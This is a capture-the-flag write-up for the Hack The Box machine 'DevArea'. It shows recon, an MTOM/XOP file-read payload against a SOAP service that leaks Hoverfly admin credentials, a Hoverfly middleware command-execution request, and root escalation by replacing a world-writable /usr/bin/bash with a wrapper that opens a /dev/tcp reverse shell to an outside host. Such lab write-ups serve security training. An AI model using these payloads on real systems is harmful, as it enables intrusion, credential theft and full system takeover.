

# HTB: DevArea
**Platform:** [Hack The Box](https://app.hackthebox.com/machines/DevArea)  
**Difficulty:** `Medium`  
**OS:** `Linux`  
---

## Reconnaissance

Today we will talk about hacking the Linux machine from Hackthebox named DevArea . Lets start with initial scanning and reconnaissance methods.

Every hacker has own method to do scanning and enumeration , also by using tools changes to everyone.I prefer rustscan firstly to find open ports and then scan them with nmap.
```bash
┌──(samurai㉿samurai)-[~/HTB/HTB-reports/Manual-WriteUps/DevArea]
└─$ rustscan -a 10.129.17.49 --ulimit 5000
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog         :
: https://github.com/RustScan/RustScan :
 --------------------------------------
To scan or not to scan? That is the question.

[~] The config file is expected to be at "/home/samurai/.rustscan.toml"
[~] Automatically increasing ulimit value to 5000.
Open 10.129.17.49:21
Open 10.129.17.49:22
Open 10.129.17.49:80
Open 10.129.17.49:8080
Open 10.129.17.49:8500
Open 10.129.17.49:8888
[~] Starting Script(s)
[~] Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-29 18:57 +0400
Initiating Ping Scan at 18:57
Scanning 10.129.17.49 [4 ports]
Completed Ping Scan at 18:57, 0.19s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 18:57
Completed Parallel DNS resolution of 1 host. at 18:57, 0.50s elapsed
DNS resolution of 1 IPs took 0.50s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating SYN Stealth Scan at 18:57
Scanning 10.129.17.49 [6 ports]
Discovered open port 8888/tcp on 10.129.17.49
Discovered open port 8080/tcp on 10.129.17.49
Discovered open port 22/tcp on 10.129.17.49
Discovered open port 21/tcp on 10.129.17.49
Discovered open port 8500/tcp on 10.129.17.49
Discovered open port 80/tcp on 10.129.17.49
Completed SYN Stealth Scan at 18:57, 0.19s elapsed (6 total ports)
Nmap scan report for 10.129.17.49
Host is up, received echo-reply ttl 63 (0.17s latency).
Scanned at 2026-03-29 18:57:20 +04 for 0s

PORT     STATE SERVICE        REASON
21/tcp   open  ftp            syn-ack ttl 63
22/tcp   open  ssh            syn-ack ttl 63
80/tcp   open  http           syn-ack ttl 63
8080/tcp open  http-proxy     syn-ack ttl 63
8500/tcp open  fmtp           syn-ack ttl 63
8888/tcp open  sun-answerbook syn-ack ttl 63

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 1.03 seconds
           Raw packets sent: 10 (416B) | Rcvd: 7 (292B)

┌──(samurai㉿samurai)-[~/HTB/HTB-reports/Manual-WriteUps/DevArea]
└─$ cat nmap.out           
Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-29 19:15 +0400
Nmap scan report for devarea.htb (10.129.17.49)
Host is up (0.19s latency).

PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.5
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxr-xr-x    2 ftp      ftp          4096 Sep 22  2025 pub
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.10.15.185
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.5 - secure, fast, stable
|_End of status
22/tcp   open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.15 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 83:13:6b:a1:9b:28:fd:bd:5d:2b:ee:03:be:9c:8d:82 (ECDSA)
|_  256 0a:86:fa:65:d1:20:b4:3a:57:13:d1:1a:c2:de:52:78 (ED25519)
80/tcp   open  http    Apache httpd 2.4.58
|_http-title: DevArea - Connect with Top Development Talent
|_http-server-header: Apache/2.4.58 (Ubuntu)
8080/tcp open  http    Jetty 9.4.27.v20200227
|_http-title: Error 404 Not Found
|_http-server-header: Jetty(9.4.27.v20200227)
8500/tcp open  http    Golang net/http server
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.0 500 Internal Server Error
|     Content-Type: text/plain; charset=utf-8
|     X-Content-Type-Options: nosniff
|     Date: Sun, 29 Mar 2026 15:15:10 GMT
|     Content-Length: 64
|     This is a proxy server. Does not respond to non-proxy requests.
|   GenericLines, Help, LPDString, RTSPRequest, SIPOptions, SSLSessionReq, Socks5: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest, HTTPOptions: 
|     HTTP/1.0 500 Internal Server Error
|     Content-Type: text/plain; charset=utf-8
|     X-Content-Type-Options: nosniff
|     Date: Sun, 29 Mar 2026 15:14:52 GMT
|     Content-Length: 64
|_    This is a proxy server. Does not respond to non-proxy requests.
|_http-title: Site doesn't have a title (text/plain; charset=utf-8).
8888/tcp open  http    Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
|_http-title: Hoverfly Dashboard
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8500-TCP:V=7.98%I=7%D=3/29%Time=69C9422A%P=x86_64-pc-linux-gnu%r(Ge
SF:nericLines,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20t
SF:ext/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x
SF:20Request")%r(GetRequest,E9,"HTTP/1\.0\x20500\x20Internal\x20Server\x20
SF:Error\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nX-Content-Typ
SF:e-Options:\x20nosniff\r\nDate:\x20Sun,\x2029\x20Mar\x202026\x2015:14:52
SF:\x20GMT\r\nContent-Length:\x2064\r\n\r\nThis\x20is\x20a\x20proxy\x20ser
SF:ver\.\x20Does\x20not\x20respond\x20to\x20non-proxy\x20requests\.\n")%r(
SF:HTTPOptions,E9,"HTTP/1\.0\x20500\x20Internal\x20Server\x20Error\r\nCont
SF:ent-Type:\x20text/plain;\x20charset=utf-8\r\nX-Content-Type-Options:\x2
SF:0nosniff\r\nDate:\x20Sun,\x2029\x20Mar\x202026\x2015:14:52\x20GMT\r\nCo
SF:ntent-Length:\x2064\r\n\r\nThis\x20is\x20a\x20proxy\x20server\.\x20Does
SF:\x20not\x20respond\x20to\x20non-proxy\x20requests\.\n")%r(RTSPRequest,6
SF:7,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x
SF:20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request")%
SF:r(Help,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/
SF:plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Re
SF:quest")%r(SSLSessionReq,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConte
SF:nt-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\
SF:n400\x20Bad\x20Request")%r(FourOhFourRequest,E9,"HTTP/1\.0\x20500\x20In
SF:ternal\x20Server\x20Error\r\nContent-Type:\x20text/plain;\x20charset=ut
SF:f-8\r\nX-Content-Type-Options:\x20nosniff\r\nDate:\x20Sun,\x2029\x20Mar
SF:\x202026\x2015:15:10\x20GMT\r\nContent-Length:\x2064\r\n\r\nThis\x20is\
SF:x20a\x20proxy\x20server\.\x20Does\x20not\x20respond\x20to\x20non-proxy\
SF:x20requests\.\n")%r(LPDString,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\
SF:nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\
SF:r\n\r\n400\x20Bad\x20Request")%r(SIPOptions,67,"HTTP/1\.1\x20400\x20Bad
SF:\x20Request\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnect
SF:ion:\x20close\r\n\r\n400\x20Bad\x20Request")%r(Socks5,67,"HTTP/1\.1\x20
SF:400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charset=utf-8\
SF:r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request");
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|router
Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 4.15 - 5.19, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 2 hops
Service Info: Host: _; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 8500/tcp)
HOP RTT       ADDRESS
1   166.92 ms 10.10.14.1
2   170.36 ms devarea.htb (10.129.17.49)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 47.85 seconds
```

We see open ports and lets start enumerating them one by one.

## Enumeration

First , we see that we have an anonymous access to ftp server. Lets see what is in saved there.

```bash
┌──(samurai㉿samurai)-[~/…/HTB-reports/Manual-WriteUps/DevArea/employee-service]
└─$ ftp 10.129.17.49         
Connected to 10.129.17.49.
220 (vsFTPd 3.0.5)
Name (10.129.17.49:samurai): anonymous
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||48641|)
150 Here comes the directory listing.
drwxr-xr-x    2 ftp      ftp          4096 Sep 22  2025 pub
226 Directory send OK.
ftp> 
```

We download its content to our attacker machine and but it is nothing important for us and does not give any clue to us.
Then we switching our direction to Port 80 and doing some directory fuzzing and enumeration.

```bash
┌──(samurai㉿samurai)-[~/HTB/HTB-reports/Manual-WriteUps/DevArea]
└─$ ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-small.txt -u http://devarea.htb/FUZZ  -fs 22211

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://devarea.htb/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-small.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 22211
________________________________________________

assets                  [Status: 301, Size: 311, Words: 20, Lines: 10, Duration: 163ms]
[WARN] Caught keyboard interrupt (Ctrl-C)
```

Unfortunately We did not find anything from Port 80 except assets folder which gives Permission Error when accessing it from browser.Lets turn to Port 8080 . 

```bash
┌──(samurai㉿samurai)-[~/HTB/HTB-reports/Manual-WriteUps/DevArea]
└─$ curl -v http://devarea.htb:8080/                                    
* Host devarea.htb:8080 was resolved.
* IPv6: (none)
* IPv4: 10.129.17.26
*   Trying 10.129.17.26:8080...
* Established connection to devarea.htb (10.129.17.26 port 8080) from 10.10.15.185 port 52132 
* using HTTP/1.x
> GET / HTTP/1.1
> Host: devarea.htb:8080
> User-Agent: curl/8.17.0
> Accept: */*
> 
* Request completely sent off
< HTTP/1.1 404 Not Found
< Cache-Control: must-revalidate,no-cache,no-store
< Content-Type: text/html;charset=iso-8859-1
< Content-Length: 437
< Server: Jetty(9.4.27.v20200227)
< 
<html>
<head>
<meta http-equiv="Content-Type" content="text/html;charset=utf-8"/>
<title>Error 404 Not Found</title>
</head>
<body><h2>HTTP ERROR 404 Not Found</h2>
<table>
<tr><th>URI:</th><td>/</td></tr>
<tr><th>STATUS:</th><td>404</td></tr>
<tr><th>MESSAGE:</th><td>Not Found</td></tr>
<tr><th>SERVLET:</th><td>-</td></tr>
</table>
<hr><a href="http://eclipse.org/jetty">Powered by Jetty:// 9.4.27.v20200227</a><hr/>

</body>
</html>
* Connection #0 to host devarea.htb:8080 left intact
```

Here we obtained version info about service running on 8080 port and doing some researching about it . From here we informed that it exposures information disclosure https://www.rapid7.com/db/vulnerabilities/redhat-openshift-cve-2019-17638/ , but it does not give any clue.

And 8500 port is proxy server which cannot be related to our scenario. Lets enumerate port 8888.

```bash
┌──(samurai㉿samurai)-[~/HTB/HTB-reports/Manual-WriteUps/DevArea]
└─$ curl -v http://devarea.htb:8888/
* Host devarea.htb:8888 was resolved.
* IPv6: (none)
* IPv4: 10.129.17.26
*   Trying 10.129.17.26:8888...
* Established connection to devarea.htb (10.129.17.26 port 8888) from 10.10.15.185 port 39626 
* using HTTP/1.x
> GET / HTTP/1.1
> Host: devarea.htb:8888
> User-Agent: curl/8.17.0
> Accept: */*
> 
* Request completely sent off
< HTTP/1.1 200 OK
< Accept-Ranges: bytes
< Content-Length: 600
< Content-Type: text/html; charset=utf-8
< Last-Modified: Thu, 13 Mar 2025 22:45:45 GMT
< Date: Sun, 29 Mar 2026 17:20:22 GMT
< 
<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <title>Hoverfly Dashboard</title>
  <base href="/">

  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link rel="icon" type="image/x-icon" href="favicon.ico">
<link rel="stylesheet" href="styles.6f6b999bedb20ff0d327.css"></head>
<body>
  <app-root></app-root>
<script type="text/javascript" src="runtime.06daa30a2963fa413676.js"></script><script type="text/javascript" src="polyfills.09835b67f4e254a9e063.js"></script><script type="text/javascript" src="main.8c9b7348638cc8a40f85.js"></script></body>
</html>
* Connection #0 to host devarea.htb:8888 left intact
```

Perfect , We found Hoverfyl running on port 8888. Lets do some researching about this service. From here https://github.com/SpectoLabs/hoverfly/security/advisories/GHSA-r4h8-hfp2-ggmf we informed that it has RCE vulnerability but unfortunately it did not work as we expected.

I have to turn back to port 8080 because i skipped it but maybe it can be exploited anyway.

And Here we go , We found on 8080 port SOAP Web service -> SOAP (Simple Object Access Protocol) web services, while often considered robust and used in legacy banking, telecommunications, and government systems, are susceptible to a variety of exploits, particularly centered around XML parsing vulnerabilities, weak authentication, and improper input handling.

Perfect for us, We create request.xml as related founding from http://devarea.htb:8080/employeeservice?wsdl and with curl request the target via POST Request

```bash
┌──(samurai㉿samurai)-[~/HTB/HTB-reports/Manual-WriteUps/DevArea]
└─$ curl -X POST -H "Content-Type: text/xml" -d @request.xml http://devarea.htb:8080/employeeservice
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><ns2:submitReportResponse xmlns:ns2="http://devarea.htb/"><return>Report received from TestUser. Department: IT. Content: This is a test report</return></ns2:submitReportResponse></soap:Body></soap:Envelope>                                                                                                                                                                                              
```

Then I added XXE payload to xml file but DTD entity is forbidden and need to bypass it or find another way . Wait there is a way of it ->
MTOM (Message Transmission Optimization Mechanism) and XOP (XML-binary Optimized Packaging). To solve this, MTOM/XOP was created. It allows a SOAP message to be sent as a multipart HTTP request (similar to how you upload files on a normal website). Instead of putting the file directly in the XML, the XML uses an <xop:Include> tag that points to the file, and the backend parser fetches it and stitches it together.

```bash
┌──(samurai㉿samurai)-[~/HTB/HTB-reports/Manual-WriteUps/DevArea]
└─$ printf -- '--MIMEBoundary\r\nContent-Type: application/xop+xml; charset=UTF-8; type="text/xml"\r\nContent-Transfer-Encoding: 8bit\r\nContent-ID: <root@example.com>\r\n\r\n<?xml version="1.0"?>\n<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" xmlns:tns="http://devarea.htb/">\n<soap:Body><tns:submitReport><arg0><confidential>false</confidential>\n<content><xop:Include xmlns:xop="http://www.w3.org/2004/08/xop/include" href="file:///etc/systemd/system/hoverfly.service"/></content>\n<department>x</department><employeeName>x</employeeName>\n</arg0></tns:submitReport></soap:Body></soap:Envelope>\r\n--MIMEBoundary--\r\n' > xop_payload.txt
                                                                                                                                                                                              
┌──(samurai㉿samurai)-[~/HTB/HTB-reports/Manual-WriteUps/DevArea]
└─$ curl -s -X POST http://devarea.htb:8080/employeeservice \
  -H 'Content-Type: multipart/related; type="application/xop+xml"; boundary="MIMEBoundary"; start="<root@example.com>"; start-info="text/xml"' \
  --data-binary @xop_payload.txt
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><ns2:submitReportResponse xmlns:ns2="http://devarea.htb/"><return>Report received from x. Department: x. Content: W1VuaXRdCkRlc2NyaXB0aW9uPUhvdmVyRmx5IHNlcnZpY2UKQWZ0ZXI9bmV0d29yay50YXJnZXQKCltTZXJ2aWNlXQpVc2VyPWRldl9yeWFuCkdyb3VwPWRldl9yeWFuCldvcmtpbmdEaXJlY3Rvcnk9L29wdC9Ib3ZlckZseQpFeGVjU3RhcnQ9L29wdC9Ib3ZlckZseS9ob3ZlcmZseSAtYWRkIC11c2VybmFtZSBhZG1pbiAtcGFzc3dvcmQgTzdJSjI3TXl5WGlVIC1saXN0ZW4tb24taG9zdCAwLjAuMC4wCgpSZXN0YXJ0PW9uLWZhaWx1cmUKUmVzdGFydFNlYz01ClN0YXJ0TGltaXRJbnRlcnZhbFNlYz02MApTdGFydExpbWl0QnVyc3Q9NQpMaW1pdE5PRklMRT02NTUzNgpTdGFuZGFyZE91dHB1dD1qb3VybmFsClN0YW5kYXJkRXJyb3I9am91cm5hbAoKW0luc3RhbGxdCldhbnRlZEJ5PW11bHRpLXVzZXIudGFyZ2V0Cg==</return></ns2:submitReportResponse></soap:Body></soap:Envelope>                                                                                                                               
```

As you see , we got base64 encoded something and need to be decoded.->

```bash
┌──(samurai㉿samurai)-[~/HTB/HTB-reports/Manual-WriteUps/DevArea]
└─$ echo 'W1VuaXRdCkRlc2NyaXB0aW9uPUhvdmVyRmx5IHNlcnZpY2UKQWZ0ZXI9bmV0d29yay50YXJnZXQKCltTZXJ2aWNlXQpVc2VyPWRldl9yeWFuCkdyb3VwPWRldl9yeWFuCldvcmtpbmdEaXJlY3Rvcnk9L29wdC9Ib3ZlckZseQpFeGVjU3RhcnQ9L29wdC9Ib3ZlckZseS9ob3ZlcmZseSAtYWRkIC11c2VybmFtZSBhZG1pbiAtcGFzc3dvcmQgTzdJSjI3TXl5WGlVIC1saXN0ZW4tb24taG9zdCAwLjAuMC4wCgpSZXN0YXJ0PW9uLWZhaWx1cmUKUmVzdGFydFNlYz01ClN0YXJ0TGltaXRJbnRlcnZhbFNlYz02MApTdGFydExpbWl0QnVyc3Q9NQpMaW1pdE5PRklMRT02NTUzNgpTdGFuZGFyZE91dHB1dD1qb3VybmFsClN0YW5kYXJkRXJyb3I9am91cm5hbAoKW0luc3RhbGxdCldhbnRlZEJ5PW11bHRpLXVzZXIudGFyZ2V0Cg==' | base64 -d
[Unit]
Description=HoverFly service
After=network.target

[Service]
User=dev_ryan
Group=dev_ryan
WorkingDirectory=/opt/HoverFly
ExecStart=/opt/HoverFly/hoverfly -add -username admin -password O7IJ27MyyXiU -listen-on-host 0.0.0.0

Restart=on-failure
RestartSec=5
StartLimitIntervalSec=60
StartLimitBurst=5
LimitNOFILE=65536
StandardOutput=journal
StandardError=journal

[Install]
WantedBy=multi-user.target
```

Perfect! We found valid credentials admin: O7IJ27MyyXiU and it is a part of Hoverfly . Lets login on it 
After being authenticated on port 8888 , We found its version v1.11.3 and from here https://github.com/SpectoLabs/hoverfly/security/advisories/GHSA-r4h8-hfp2-ggmf we get details about this vulnerability which refers to  CVE-2025-54123.

```bash
PUT /api/v2/hoverfly/middleware HTTP/1.1
Host: devarea.htb:8888
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Authorization: Bearer eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJleHAiOjIwODU4NDY3MDYsImlhdCI6MTc3NDgwNjcwNiwic3ViIjoiIiwidXNlcm5hbWUiOiJhZG1pbiJ9.szAJ2wLZERGuPLhgldCUKFKRgXozsJ1xeF-gIqrisuJdGMIyw00sl8tDfGM2WDk6BwBXwfhwUiC0yz7AIjU_Rg
Connection: keep-alive
Referer: http://devarea.htb:8888/dashboard
Content-Length: 56

{
    "binary": "/bin/bash",
    "script": "whoami"
}


HTTP/1.1 422 Unprocessable Entity
Date: Sun, 29 Mar 2026 17:56:42 GMT
Content-Length: 490
Content-Type: text/plain; charset=utf-8

{"error":"Failed to unmarshal JSON from middleware\nCommand: /bin/bash /tmp/hoverfly/hoverfly_1731950101\ninvalid character 'd' looking for beginning of value\n\nSTDIN:\n{\"response\":{\"status\":200,\"body\":\"ok\",\"encodedBody\":false,\"headers\":{\"test_header\":[\"true\"]}},\"request\":{\"path\":\"/\",\"method\":\"GET\",\"destination\":\"www.test.com\",\"scheme\":\"\",\"query\":\"\",\"formData\":null,\"body\":\"\",\"headers\":{\"test_header\":[\"true\"]}}}\n\nSTDOUT:\ndev_ryan\n"}
```


Perfect! It works and lets get our reverse shell

## Privilege Escalation

```bash
┌──(samurai㉿samurai)-[~/HTB/HTB-reports/Manual-WriteUps/DevArea]
└─$ rlwrap nc -lnvp 1337
listening on [any] 1337 ...
connect to [10.10.15.185] from (UNKNOWN) [10.129.17.26] 60782
bash: cannot set terminal process group (1454): Inappropriate ioctl for device
bash: no job control in this shell
dev_ryan@devarea:/opt/HoverFly$ python3 -c "import pty;pty.spawn('/bin/bash')"
<Fly$ python3 -c "import pty;pty.spawn('/bin/bash')"
dev_ryan@devarea:/opt/HoverFly$ whoami
whoami
dev_ryan
dev_ryan@devarea:/opt/HoverFly$ id
id
uid=1001(dev_ryan) gid=1001(dev_ryan) groups=1001(dev_ryan)
dev_ryan@devarea:/opt/HoverFly$ sudo -l
sudo -l
Matching Defaults entries for dev_ryan on devarea:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User dev_ryan may run the following commands on devarea:
    (root) NOPASSWD: /opt/syswatch/syswatch.sh, !/opt/syswatch/syswatch.sh
        web-stop, !/opt/syswatch/syswatch.sh web-restart
dev_ryan@devarea:/opt/HoverFly$ 
```

Amazing! We got the shell as dev_ryan user and you see we have some sudo commands rights. Lets abuse it for our malicious purpose).
Based on the provided sudoers configuration,
dev_ryan can run /opt/syswatch/syswatch.sh as root without a password. However, the entries !/opt/syswatch/syswatch.sh web-stop and !/opt/syswatch/syswatch.sh web-restart explicitly forbid running the script with those specific arguments, allowing only other command-line arguments. 

We found syswatch source code in zipped format in our compromised user folder and unzipping it then finding some clues to be root

```bash
dev_ryan@devarea:~/syswatch$ cat ~/syswatch/plugins/log_monitor.sh
cat ~/syswatch/plugins/log_monitor.sh
#!/bin/bash
source /opt/syswatch/config/syswatch.conf
source /opt/syswatch/plugins/common.sh
umask 022

LOG_FILE="$LOG_MONITOR_LOG"
EMAIL="$EMAIL_ADMIN"
[ ! -f "$LOG_FILE" ] && touch "$LOG_FILE" && chmod 644 "$LOG_FILE"

declare -A LOG_PATTERNS=(
    ["/var/log/syslog"]="(error|critical|fatal|failed|failure)"
    ["/var/log/auth.log"]="(failed|invalid|error|authentication failure)"
    ["/var/log/apache2/error.log"]="(fatal|error|critical)"
    ["/var/log/mysql/error.log"]="(ERROR|CRITICAL)"
)

TIMESTAMP_FILE="/tmp/logmonitor_timestamp"
[ -f "$TIMESTAMP_FILE" ] && LAST_RUN=$(cat "$TIMESTAMP_FILE") || LAST_RUN=$(date -d "10 minutes ago" "+%Y-%m-%d %H:%M:%S")
date "+%Y-%m-%d %H:%M:%S" > "$TIMESTAMP_FILE"

date_to_seconds() { date -d "$1" +%s; }
LAST_RUN_SECONDS=$(date_to_seconds "$LAST_RUN")
CURRENT_SECONDS=$(date_to_seconds "$(date '+%Y-%m-%d %H:%M:%S')")

ALERTS=""
for LOG in "${!LOG_PATTERNS[@]}"; do
    [ ! -f "$LOG" ] && log_message "$LOG_FILE" "Warning: $LOG not found" && continue
    NEW_ENTRIES=$(grep -i -E "${LOG_PATTERNS[$LOG]}" "$LOG")
    [ ! -z "$NEW_ENTRIES" ] && ALERTS="$ALERTS$LOG - New critical entries:\n$(echo "$NEW_ENTRIES" | head -n 15)\n\n"
done

[ ! -z "$ALERTS" ] && send_alert "$LOG_FILE" "LOG ALERT:\n$ALERTS" "$EMAIL"
exit 0
```

Jackpot! Reading the source code reveals exactly what we need.

Let's look at the execute_plugin function. The script explicitly defines an array of plugins that it runs as root instead of the syswatch user.I’ve reviewed log_monitor.sh, and there’s no immediate command injection inside this script itself. It essentially reads a timestamp from /tmp, greps a few hardcoded log files for errors, and if it finds any, it formats an alert string. Because log_monitor.sh runs as root, anything it sources also runs as root. The send_alert function (which isn't defined in this script) must be inside common.sh. It is highly likely that send_alert is vulnerable to command injection (perhaps by using eval or unsafely processing the log strings we can control)

```bash
dev_ryan@devarea:~/syswatch$ cat ~/syswatch/plugins/common.sh
cat ~/syswatch/plugins/common.sh
#!/bin/bash
# Common functions for all monitoring scripts

log_message() {
    local logfile="$1"
    local msg="$2"
    if [ -L "$logfile" ]; then
        rm -f -- "$logfile"
        : > "$logfile"
        chmod 644 "$logfile"
    elif [ ! -f "$logfile" ]; then
        : > "$logfile"
        chmod 644 "$logfile"
    fi
    echo "$(date '+%Y-%m-%d %H:%M:%S') - $msg" >> "$logfile"
}

send_alert() {
    local logfile="$1"
    local msg="$2"
    local email="$3"
    log_message "$logfile" "$msg"
    echo "$msg" | mail -s "Server Alert: $(hostname)" "$email"
}
dev_ryan@devarea:~/syswatch$    
```

But unfortunately it is a rabbit hole and safe from command injection. I uploaded linpeas to target and executed.
```bash
╔══════════╣ Interesting writable files owned by me or writable by everyone (not in Home) (max 200)
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#writable-files
/dev/mqueue
/dev/shm
/home/dev_ryan
/nix/var/nix/gcroots/per-user
/nix/var/nix/profiles/per-user
/run/lock
/run/screen
/run/screen/S-dev_ryan
/tmp
/tmp/.font-unix
/tmp/hoverfly
/tmp/hoverfly/hoverfly_1731950101
/tmp/hoverfly/hoverfly_2018145382
/tmp/hoverfly/hoverfly_2831892675
/tmp/hoverfly/hoverfly_833734602
/tmp/hsperfdata_dev_ryan
/tmp/hsperfdata_dev_ryan/1453
/tmp/.ICE-unix
/tmp/linpeas.sh
/tmp/tmux-1001
/tmp/.X11-unix
/tmp/.XIM-unix
/usr/bin/bash
/var/crash
/var/tmp
/var/www/devarea/assets/css/style.css
/var/www/devarea/index.html
```

Interesting that /usr/bin/bash is writable by everyone and it will help us to execute our script as root user by using syswatch binary.!

```bash
dev_ryan@devarea:/opt/HoverFly$ cd /tmp
cd /tmp
dev_ryan@devarea:/tmp$ cp /bin/bash /tmp/bash.bak

cat > /tmp/evil_bash << 'EOF'
#!/tmp/bash.bak
/tmp/bash.bak -i >& /dev/tcp/10.10.15.185/1338 0>&1 &
cp /tmp/bash.bak /usr/bin/bash
exec /tmp/bash.bak "$@"
EOF

chmod +x /tmp/evil_bash
cp /bin/bash /tmp/bash.bak
cp: cannot create regular file '/tmp/bash.bak': Text file busy
dev_ryan@devarea:/tmp$ 
dev_ryan@devarea:/tmp$ cat > /tmp/evil_bash << 'EOF'
> #!/tmp/bash.bak
> /tmp/bash.bak -i >& /dev/tcp/10.10.15.185/1338 0>&1 &
> cp /tmp/bash.bak /usr/bin/bash
> exec /tmp/bash.bak "$@"
> EOF
dev_ryan@devarea:/tmp$ 
dev_ryan@devarea:/tmp$ chmod +x /tmp/evil_bash
```

Then we have to use another shell to kill all bash processes and restart it due to trigger our script and got the shell to our listener 
(Dont forget to open listener on port 1338 or whatever you choose before running last command)

```bash
/bin/dash -c 'killall -9 bash; sleep 2; cp /tmp/evil_bash /usr/bin/bash; sudo /opt/syswatch/syswatch.sh --version' &
```

Wait a bit and you will have to get your root shell!

```bash
┌──(samurai㉿samurai)-[~/HTB/HTB-reports/Manual-WriteUps/DevArea]
└─$ rlwrap nc -lnvp 1338
listening on [any] 1338 ...
connect to [10.10.15.185] from (UNKNOWN) [10.129.16.173] 35964
bash.bak: cannot set terminal process group (1457): Inappropriate ioctl for device
bash.bak: no job control in this shell
root@devarea:/tmp# cd /root
cd /root
root@devarea:~# cat root.txt
cat root.txt
9a9de35a0d1af486cc523dc5eb382b72
root@devarea:~# 
```

And boom , we got the shell and grabbed our flag
Quick summary of Privilege Escalation : 
    #!/tmp/bash.bak: This is the most critical part. Because you are overwriting the system's bash, if your script called bash inside of it, it would trigger an infinite loop (calling itself over and over until the system crashed). You pointed the shebang to the clean backup of bash to execute your payload safely.

    /tmp/bash.bak -i >& /dev/tcp/... 0>&1 &: This triggers the reverse shell using the clean backup binary, and the & backgrounds the process so the script can continue running.

    cp /tmp/bash.bak /usr/bin/bash: This immediately restores the legitimate shell so the box doesn't break for other users or background services.

    exec /tmp/bash.bak "$@": This takes whatever arguments root originally intended to pass to bash (in this case, executing syswatch.sh) and passes them to the restored, clean binary. This ensures the original script still runs normally, masking the fact that you just hijacked it.

Thanks for attention).
